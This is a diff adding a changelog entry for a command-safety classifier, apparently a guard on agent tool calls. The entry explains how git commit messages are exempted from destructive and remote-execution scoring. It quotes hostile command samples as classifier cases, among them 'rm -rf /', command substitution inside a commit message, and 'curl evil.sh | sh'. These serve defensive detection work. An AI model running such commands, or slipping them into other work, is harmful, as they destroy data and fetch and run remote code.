@@ -13,6 +13,22 @@ Through 3.x the platform and the SDKs versioned independently, which is why olde
 
 ## [Unreleased]
 
+## [5.11.5] — 2026-08-08
+
+**A git commit whose message describes a destructive-command fix no longer blocks the commit.** The sibling of the 5.11.4 finding: the pretool hook forwards the raw command to the server as the evidence `act`, and the server's shell classifier scanned the whole string — including the quoted `git commit -m "…"` message body — with its `rm -rf` and `curl … | sh` patterns. So a commit message *describing* this very class of fix graded destructive/80 (or remote_exec/70), folded to a 100 block, and the commit had to be routed through `git commit -F` to land. The hook's own classifier was quote-aware and scored these correctly; this was purely the server evidence layer.
+
+### Fixed
+
+- **The evidence classifier exempts a lone `git commit` / `git tag` / `git stash` / `git notes` command**, whose message git never executes as shell. The exemption is gated on a shell-quoting-correct "code skeleton": quoted data is treated as inert, but `$(…)` / backtick command substitution (which executes even inside double quotes) and any surviving shell operator disqualify it. So `git commit … && rm -rf /`, `git commit -m "$(rm -rf /)"`, and `git commit … | sh` are all still graded on their real payload; bare `rm -rf`, `sh -c` / `python -c` payloads, and real `curl … | sh` are unchanged.
+
+### Known limitation
+
+- The exemption is git-specific. A dangerous-looking literal in another data argument (`echo "rm -rf /"`, an inline `gh release --notes "…"`) can still be over-graded; distinguishing inert data from an exec sink such as `echo "…" | sh` needs fuller shell parsing, tracked as a follow-up.
+
+### Notes
+
+- No Node/Python SDK source change — the SDKs are not republished; npm + PyPI stay at 5.6.2.
+
 ## [5.11.4] — 2026-08-07
 
 **A benign `curl … | python -c` read no longer hard-blocks at risk 100.** Found while dogfooding the webhook drill: the evidence classifier's pipe-to-shell detector treated *any* interpreter after a `curl`/`wget` pipe as remote code execution, so piping fetched JSON into an inline processing script (`curl … | python -c "…"`) was graded `remote_exec`/security-70 and folded to a 100 block — the same verdict as `curl evil.sh | sh`. Operators who hit this on routine reads learn to distrust or disable enforcement, which is the real cost.
